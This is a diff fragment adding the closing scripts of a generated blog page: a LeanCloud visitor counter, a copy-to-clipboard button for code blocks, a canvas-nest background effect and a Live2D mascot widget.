+            Counter('put', `/classes/Counter/${counter.objectId}`, JSON.stringify({ time: { "__op":"Increment", "amount":1 } }))
+            
+            .done(function () {
+                  var $element = $(document.getElementById(url));
+                  $element.find('.leancloud-visitors-count').text(counter.time + 1);
+            })
+            
+            .fail(function ({ responseJSON }) {
+                console.log('Failed to save Visitor num, with error message: ' + responseJSON.error);
+            })
+          } else {
+            
+              Counter('post', '/classes/Counter', JSON.stringify({ title: title, url: url, time: 1}))
+                .done(function () {
+                  var $element = $(document.getElementById(url));
+                  $element.find('.leancloud-visitors-count').text(1);
+                })
+                .fail(function () {
+                  console.log('Failed to create');
+                });
+            
+          }
+        })
+      .fail(function ({ responseJSON }) {
+        console.log('LeanCloud Counter Error:' + responseJSON.code + " " + responseJSON.error);
+      });
+    }
+    
+
+    $(function() {
+      $.get('https://app-router.leancloud.cn/2/route?appId=' + "no3Ip4mNLc3JyF1AeTy8LrAm-gzGzoHsz")
+        .done(function ({ api_server }) {
+          var Counter = function (method, url, data) {
+            return $.ajax({
+              method: method,
+              url: `https://${api_server}/1.1${url}`,
+              headers: {
+                'X-LC-Id': "no3Ip4mNLc3JyF1AeTy8LrAm-gzGzoHsz",
+                'X-LC-Key': "UvlYMzpJKw0Jrw61V5BA5ifU",
+                'Content-Type': 'application/json',
+              },
+              data: data,
+            });
+          };
+          
+          addCount(Counter);
+          
+        })
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  <style>
+    .copy-btn {
+      display: inline-block;
+      padding: 6px 12px;
+      font-size: 13px;
+      font-weight: 700;
+      line-height: 20px;
+      color: #333;
+      white-space: nowrap;
+      vertical-align: middle;
+      cursor: pointer;
+      background-color: #eee;
+      background-image: linear-gradient(#fcfcfc, #eee);
+      border: 1px solid #d5d5d5;
+      border-radius: 3px;
+      user-select: none;
+      outline: 0;
+    }
+
+    .highlight-wrap .copy-btn {
+      transition: opacity .3s ease-in-out;
+      opacity: 0;
+      padding: 2px 6px;
+      position: absolute;
+      right: 4px;
+      top: 8px;
+    }
+
+    .highlight-wrap:hover .copy-btn,
+    .highlight-wrap .copy-btn:focus {
+      opacity: 1
+    }
+
+    .highlight-wrap {
+      position: relative;
+    }
+  </style>
+  <script>
+    $('.highlight').each(function (i, e) {
+      var $wrap = $('<div>').addClass('highlight-wrap')
+      $(e).after($wrap)
+      $wrap.append($('<button>').addClass('copy-btn').append('复制').on('click', function (e) {
+        var code = $(this).parent().find('.code').find('.line').map(function (i, e) {
+          return $(e).text()
+        }).toArray().join('\n')
+        var ta = document.createElement('textarea')
+        document.body.appendChild(ta)
+        ta.style.position = 'absolute'
+        ta.style.top = '0px'
+        ta.style.left = '0px'
+        ta.value = code
+        ta.select()
+        ta.focus()
+        var result = document.execCommand('copy')
+        document.body.removeChild(ta)
+        
+        $(this).blur()
+      })).on('mouseleave', function (e) {
+        var $b = $(this).find('.copy-btn')
+        setTimeout(function () {
+          $b.text('复制')
+        }, 300)
+      }).append(e)
+    })
+  </script>
+
+
+  
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-backstretch/2.0.4/jquery.backstretch.min.js"></script>;
+  <script>
+  //$("body").backstretch("/images/background.jpg");
+  </script>
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
+</html>
